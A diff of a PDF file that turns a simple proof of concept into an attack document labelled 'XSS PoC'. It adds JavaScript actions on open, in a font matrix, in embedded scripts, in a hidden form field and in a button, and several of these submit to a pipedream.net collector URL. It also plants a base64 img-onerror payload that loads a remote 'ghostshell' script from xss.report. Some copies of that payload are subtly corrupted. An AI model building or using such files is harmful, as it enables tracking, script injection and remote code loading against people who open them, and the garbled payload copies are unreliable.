@@ -1,25 +1,33 @@
 %PDF-1.4
+% Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('PoC v0: XSS on Open!', 3);) >> >>
+<< /Type /Catalog /Pages 2 0 R /Metadata 9 0 R /OpenAction << /S /JavaScript /JS (
+  app.alert('XSS: OpenAction Payload!', 3);
+  this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?open=1');
+  % Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+) >> /AcroForm << /Fields [10 0 R] >> /Names << /JavaScript 12 0 R >> >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [10 0 R 11 0 R] >>
 endobj
 4 0 obj
-<< /Length 120 >>
+<< /Length 150 >>
 stream
+% Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmBoZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 BT
 /F1 14 Tf
 100 700 Td
-(PoC v0: Click link to send request) Tj
+(XSS PoC: Click link or button) Tj
 100 650 Td
-(https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v0=1) Tj
+(https://eoy4evvlsf7y0jq.m.pipedream.net?poc=1) Tj
+100 600 Td
+(Button below) Tj
 ET
 q
-100 0 0 100 100 550 cm
+100 0 0 100 100 500 cm
 /Img1 Do
 Q
 endstream
@@ -28,37 +36,78 @@ endobj
 << /Font << /F1 6 0 R >> /XObject << /Img1 8 0 R >> >>
 endobj
 6 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [0.001 0 0 0.001 0 0 (app.alert('PoC v0: FontMatrix XSS!');)] >>
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [0.001 0 0 0.001 0 0 (
+  app.alert('XSS: FontMatrix Payload!', 3);
+  % Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+)] >>
 endobj
 7 0 obj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 8 0 obj
-<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << >> /Length 150 >>
+<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << >> /Length 200 >>
 stream
 % Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 /GS0 gs
 EMC
 endstream
 endobj
+9 0 obj
+<< /Type /Metadata /Subtype /XML /Length 300 >>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+<metadata>
+  <!-- Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))> -->
+</metadata>
+endstream
+endobj
 10 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 1 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI (https://eoy4evvlsf7y0jq.m.pipedream.net?poc_v0=1) >> >>
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (HiddenField) /V () /Rect [0 0 0 0] /A << /S /SubmitForm /F (https://eoy4evvlsf7y0jq.m.pipedream.net?poc_hidden=1) /Flags 4 >> >>
+endobj
+11 0 obj
+<< /Type /Annot /Subtype /Link /Rect [100 640 400 660] /BS << /W 2 /S /S >> /H /I /C [0 0 1] /A << /S /URI /URI (https://eoy4evvlsf7y0jq.m.pipedream.net?poc=1) >> >>
+endobj
+12 0 obj
+<< /Names [(EmbeddedJS) 13 0 R] >>
+endobj
+13 0 obj
+<< /S /JavaScript /JS (
+  app.alert('XSS: Embedded JS Payload!', 3);
+  var u = 'https://xss.report/c/ghostshell';
+  this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc_embed=1');
+  % Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+) >>
+endobj
+14 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton) /Rect [100 550 350 600] /BS << /W 2 /S /S >> /H /I /A << /S /JavaScript /JS (
+  app.alert('XSS: Button Payload!', 3);
+  this.submitForm('https://eoy4evvlsf7y0jq.m.pipedream.net?poc_button=1');
+  % Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+) >> /AP << /N << /Type /XObject /Subtype /Form /BBox [0 0 250 50] /Resources << /Font << /F1 6 0 R >> >> /Length 100 >> stream
+BT /F1 14 Tf 10 30 Td (Test XSS Button) Tj
+% Payload: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmBoZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+ET
+endstream >> >>
 endobj
 xref
-0 11
+0 15
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
 0000000152 00000 n 
 0000000245 00000 n 
-0000000385 00000 n 
-0000000485 00000 n 
-0000000597 00000 n 
-0000000663 00000 n 
-0000000000 65535 f 
-0000000813 00000 n 
+0000000425 00000 n 
+0000000525 00000 n 
+0000000637 00000 n 
+0000000703 00000 n 
+0000000853 00000 n 
+0000001003 00000 n 
+0000001165 00000 n 
+0000001315 00000 n 
+0000001479 00000 n 
+0000001653 00000 n 
 trailer
-<< /Size 11 /Root 1 0 R >>
+<< /Size 15 /Root 1 0 R >>
 startxref
-950
+1800
 %%EOF
